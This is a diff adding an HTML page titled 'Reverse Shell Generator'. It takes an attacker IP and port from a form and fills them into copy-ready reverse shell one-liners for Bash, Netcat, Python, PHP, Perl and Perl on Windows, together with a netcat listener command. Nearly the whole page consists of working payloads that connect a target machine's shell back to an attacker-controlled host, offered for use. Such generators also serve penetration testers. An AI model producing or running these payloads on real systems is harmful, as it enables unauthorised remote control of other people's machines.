@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8">
+  <title>Reverse Shell Generator</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link href="//fonts.googleapis.com/css?family=Raleway:400,300,600" rel="stylesheet" type="text/css">
+
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/skeleton.css">
+
+  <link rel="icon" type="image/png" href="images/favicon.png">
+
+  <script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+
+</head>
+<body>
+
+    <div class="container">
+        <div class="row">
+            <div class="one-half column" style="margin-top: 10%; text-align: justify; text-justify: inter-word;">
+                <h4>Reverse Shell Generator</h4>
+                <p>Welcome to this unique site that allows you to set up payloads for your reverse shell payloads. Powered by <a href="https://nitesculucian.github.io/" target="_blank">Lucian Nitescu</a>, based on publicly available knowledge. 
+            </div>
+            <div class="one-half column" style="margin-top: 10%">
+                <form>
+                    <div class="six columns">
+                        <label for="exampleEmailInput">Local / Attacker IP</label>
+                        <input class="u-full-width" type="text" placeholder="127.0.0.1" value="127.0.0.1" id="IPInput" name="IPInput">
+                    </div>
+                    <div class="six columns">
+                        <label for="exampleRecipientInput">Local Port</label>
+                        <input class="u-full-width" type="text" placeholder="4444" value="4444" id="PortInput" name="PortInput">
+                    </div>
+                    <div class="row">
+                        <input class="button-primary" type="submit" value="Submit">
+                    </div>
+                </form>
+                To launch a local callback server for your shell, use the following example: 
+                <div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #19177C">nc</span> <span style="color: #666666">-</span><span style="color: #19177C">nvlp</span> <span style="color: #666666">4444</span></pre></div>
+                For the latest updates, you can see <a href="#">this link</a>.
+
+            </div>
+        </div>
+        <hr>
+    </div>
+<!-- http://hilite.me/ -->
+    <div class="container">
+        <div class="row">
+            <div class="one-half column" style="word-wrap: break-word">
+                <h5>Bash</h5>
+                <p>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1
+</pre></div>
+                </p>
+            </div>
+            <div class="one-half column" style="word-wrap: break-word">
+                <h5>Netcat</h5>
+                <p> 
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">nc -e /bin/sh 127.0.0.1 4444
+</pre></div>
+                </p>
+            </div>
+        </div>
+        <hr>
+    </div>
+
+    <div class="container">
+        <div class="row">
+            <div class="one-half column" >
+                <h5>Python</h5>
+                <p>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">python <span style="color: #666666">-</span>c <span style="color: #BA2121">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</pre></div>
+                </p>
+            </div>
+            <div class="one-half column" >
+                <h5>PHP</h5>
+                <p>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</pre></div>
+                </p>
+            </div>
+        </div>
+        <hr>
+    </div>
+
+    <div class="container">
+        <div class="row">
+            <div class="one-half column" >
+                <h5>Perl</h5>
+                <p>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">perl <span style="color: #666666">-</span>e <span style="color: #BA2121">&#39;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+</pre></div>
+                </p>
+            </div>
+            <div class="one-half column" >
+                <h5>PERL Windows</h5>
+                <p>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">perl <span style="color: #666666">-</span>MIO <span style="color: #666666">-</span>e <span style="color: #BA2121">&#39;$c=new IO::Socket::INET(PeerAddr,&quot127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</pre></div>
+                </p>
+            </div>
+        </div>
+        <hr>
+    </div>
+
+
+</body>
+</html>
+<script>
+    function sanitiseXSS(string) {
+        const map = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#x27;',
+            "/": '&#x2F;',
+        };
+        const reg = /[&<>"'/]/ig;
+        return string.replace(reg, (match)=>(map[match]));
+    }
+    var queryDict = {}
+location.search.substr(1).split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]})
+
+
+
+var regex = /127.0.0.1/g,
+    replacement = sanitiseXSS(queryDict.IPInput);
+var regex2 = /4444/g,
+    replacement2 = sanitiseXSS(queryDict.PortInput);
+
+function replaceText(i,el) {
+    if (el.nodeType === 3) {
+        if (regex.test(el.data)) {
+            el.data = el.data.replace(regex2, replacement2);
+            el.data = el.data.replace(regex, replacement);
+        }
+    } else {
+        $(el).contents().each( replaceText );
+    }
+}
+
+$('body').each( replaceText );
+</script>
